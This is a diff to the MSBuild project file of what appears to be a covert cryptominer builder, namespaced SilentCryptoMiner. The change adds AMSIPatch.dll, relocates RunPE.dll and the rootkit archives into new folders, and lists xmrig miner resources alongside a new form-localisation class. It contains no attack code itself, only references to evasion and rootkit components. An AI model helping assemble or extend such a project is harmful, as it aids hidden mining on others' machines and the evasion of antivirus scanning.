@@ -123,6 +123,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Classes\Codedom.cs" />
+    <Compile Include="Classes\FormLocalizer.cs" />
     <Compile Include="Classes\FormSerializer.cs" />
     <Compile Include="Forms\AdvancedOptions.cs">
       <SubType>Form</SubType>
@@ -130,10 +131,6 @@
     <Compile Include="Forms\AdvancedOptions.Designer.cs">
       <DependentUpon>AdvancedOptions.cs</DependentUpon>
     </Compile>
-    <Compile Include="My Project\MyNamespace.Dynamic.Designer.cs" />
-    <Compile Include="My Project\MyNamespace.Static.1.Designer.cs" />
-    <Compile Include="My Project\MyNamespace.Static.2.Designer.cs" />
-    <Compile Include="My Project\MyNamespace.Static.3.Designer.cs" />
     <Compile Include="Forms\AlgorithmSelection.Designer.cs">
       <DependentUpon>AlgorithmSelection.cs</DependentUpon>
     </Compile>
@@ -159,12 +156,12 @@
     <Compile Include="Forms\MinerXMR.cs">
       <SubType>Form</SubType>
     </Compile>
+    <Compile Include="My Project\Application.Designer.cs" />
     <Compile Include="My Project\AssemblyInfo.cs" />
-    <Compile Include="My Project\Application.Designer.cs">
-      <AutoGen>True</AutoGen>
-      <DependentUpon>Application.myapp</DependentUpon>
-      <DesignTime>True</DesignTime>
-    </Compile>
+    <Compile Include="My Project\MyNamespace.Dynamic.Designer.cs" />
+    <Compile Include="My Project\MyNamespace.Static.1.Designer.cs" />
+    <Compile Include="My Project\MyNamespace.Static.2.Designer.cs" />
+    <Compile Include="My Project\MyNamespace.Static.3.Designer.cs" />
     <Compile Include="My Project\Settings.Designer.cs">
       <AutoGen>True</AutoGen>
       <DependentUpon>Settings.settings</DependentUpon>
@@ -176,9 +173,13 @@
       <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
     <Content Include="Resources\Code\Checker.cs" />
+    <Content Include="Resources\LocalizedControls.xml" />
+    <None Include="Resources\Modules\RunPE.dll" />
+    <None Include="Resources\Modules\AMSIPatch.dll" />
     <None Include="Resources\Compilers\resource.rcf" />
     <None Include="Resources\Compilers\template.manifest-miner" />
-    <None Include="Resources\RunPE.dll" />
+    <None Include="Resources\Rootkit\rootkit-i.zip" />
+    <None Include="Resources\Rootkit\rootkit-u.zip" />
     <None Include="app.config" />
     <None Include="My Project\app.manifest">
       <SubType>Designer</SubType>
@@ -188,8 +189,6 @@
     <None Include="Resources\Compilers\Includes.zip" />
     <None Include="Resources\Miners\libs.zip" />
     <Compile Include="Classes\Theme.cs" />
-    <None Include="Resources\rootkit-i.zip" />
-    <None Include="Resources\rootkit-u.zip" />
     <None Include="Resources\Miners\xmrig.zip" />
   </ItemGroup>
   <ItemGroup>
@@ -216,10 +215,6 @@
     </EmbeddedResource>
   </ItemGroup>
   <ItemGroup>
-    <None Include="My Project\Application.myapp">
-      <Generator>MyApplicationCodeGenerator</Generator>
-      <LastGenOutput>Application.Designer.cs</LastGenOutput>
-    </None>
     <None Include="My Project\Settings.settings">
       <Generator>SettingsSingleFileGenerator</Generator>
       <CustomToolNamespace>SilentCryptoMiner.My</CustomToolNamespace>
